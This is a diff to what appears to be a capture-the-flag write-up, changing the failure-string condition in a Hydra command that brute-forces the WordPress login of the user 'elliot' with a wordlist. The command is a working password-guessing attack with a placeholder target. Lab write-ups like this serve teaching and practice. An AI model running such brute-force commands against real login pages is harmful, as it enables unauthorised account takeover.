@@ -57,7 +57,7 @@ I verified that `elliot` was a valid user based on the error messages.
 **Cracking the Password:**
 I used Hydra to crack Elliot's password using the sorted wordlist.
 
-`hydra -l elliot -P sorted.dic <TARGET_IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"`
+`hydra -l elliot -P sorted.dic <TARGET_IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect"`
 
 ![INSERT SCREENSHOT OF HYDRA SUCCESS HERE](images/hydra_output.png)
 
